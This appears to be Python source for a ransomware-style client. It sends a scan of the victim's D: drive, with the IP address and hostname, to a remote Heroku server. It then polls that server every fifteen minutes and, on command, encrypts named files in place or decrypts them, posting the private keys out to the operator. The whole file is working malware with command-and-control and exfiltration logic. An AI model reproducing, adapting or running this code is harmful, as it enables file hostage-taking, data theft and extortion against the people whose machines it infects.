import rsa
import os
import socket
import win32api
import time
import requests
import fnmatch
import json

server_route='https://cryptserver555.herokuapp.com'
hostname = socket.gethostname()
IPAddr = socket.gethostbyname(hostname)

def key_generate(path,filename):
    file_size=os.path.getsize(str(path+filename))
    if (file_size)<400:
        try:
            if file_size==0:
                file_size=512
            publicKey, privateKey = rsa.newkeys(file_size)
            sendable_private_key=byte_to_str(privateKey)
            x=requests.post(server_route+'/send',json={"private_key":sendable_private_key,"hostname":hostname,"filename":filename,"path":path})
            return publicKey
        except:
            return 404

def file_valid(file_name,path):
    valid_extension = ["c", "js", "md", "py", "ts",
                   "cpp", "css", "txt", "html", "java", "json"]
    extension=str(file_name).split('.')[1]
    for i in valid_extension:
        if i==extension:
            if os.path.isfile(path+file_name):
                return True
    return False
        

def system_info():
    roots=[]
    items=[]
    timer=int(time.time())+0
    while int(time.time())<=timer:
        for root,dir,files in os.walk("D://"):
            if len(roots)>500:
                break
            roots.append(root)
            if(os.path.getsize(root)<40000):
                for item in fnmatch.filter(files,"*"):
                    items.append({f"{root}-->":item})
    
    x=requests.post(server_route+'/getSystemInfo',json={
        "ip":IPAddr,
        "hostname":hostname,
        "roots":json.dumps(roots),
        "items":json.dumps(items)
    })
    




def encrypt(paths,file):
    if not paths[(len(paths)-1)]=='/':
        paths=paths+'/'
    if file_valid(file_name=file,path=paths):
        try:
            with open(paths+str(file),"r") as targets:
                con=targets.read()
            with open(paths+str(file),"wb") as target:
                target.write(rsa.encrypt(con.encode(),key_generate(path=paths,filename=file)))
        except:
            return 404




def decrypt(private_key,paths,file):
    if not paths[(len(paths)-1)]=='/':
        paths=paths+'/'
    if file_valid(file_name=file,path=paths):
        try:
            with open((paths)+str(file),"rb") as targets:
                con=targets.read()
            with open((paths)+str(file),"w") as target:
                target.write(rsa.decrypt(con, private_key).decode())
        except:
            return 404


def byte_to_str(key):
    return str(key.save_pkcs1(),'UTF-8')

def str_to_byte(key):
    b= bytes(key,'UTF-8')
    return rsa.PrivateKey.load_pkcs1(b.decode('utf8'))

def server_connect():
    res=requests.post(server_route+'/getAction',json={"hostname":hostname})
    print(res.json())
    if not res.json()['data']=='server is running':
        if (res.json()['data']['filename']) and (res.json()['data']['path']):
            if (res.json()['data']['action_name'])=='encrypt':
                encrypt(paths=(res.json()['data']['path']),file=(res.json()['data']['filename']))
            elif (res.json()['data']['action_name'])=='decrypt':
                res=requests.post(server_route+'/getKey',json={"hostname":hostname})
                if (res.json()['data']['filename']) and (res.json()['data']['path']) and (res.json()['data']['key']):
                    decrypt(private_key=str_to_byte(res.json()['data']['key']),paths=(res.json()['data']['path']),file=(res.json()['data']['filename']))
    else:
        print('nothing!!!')


system_info()
while True:
    server_connect()
    time.sleep(900)
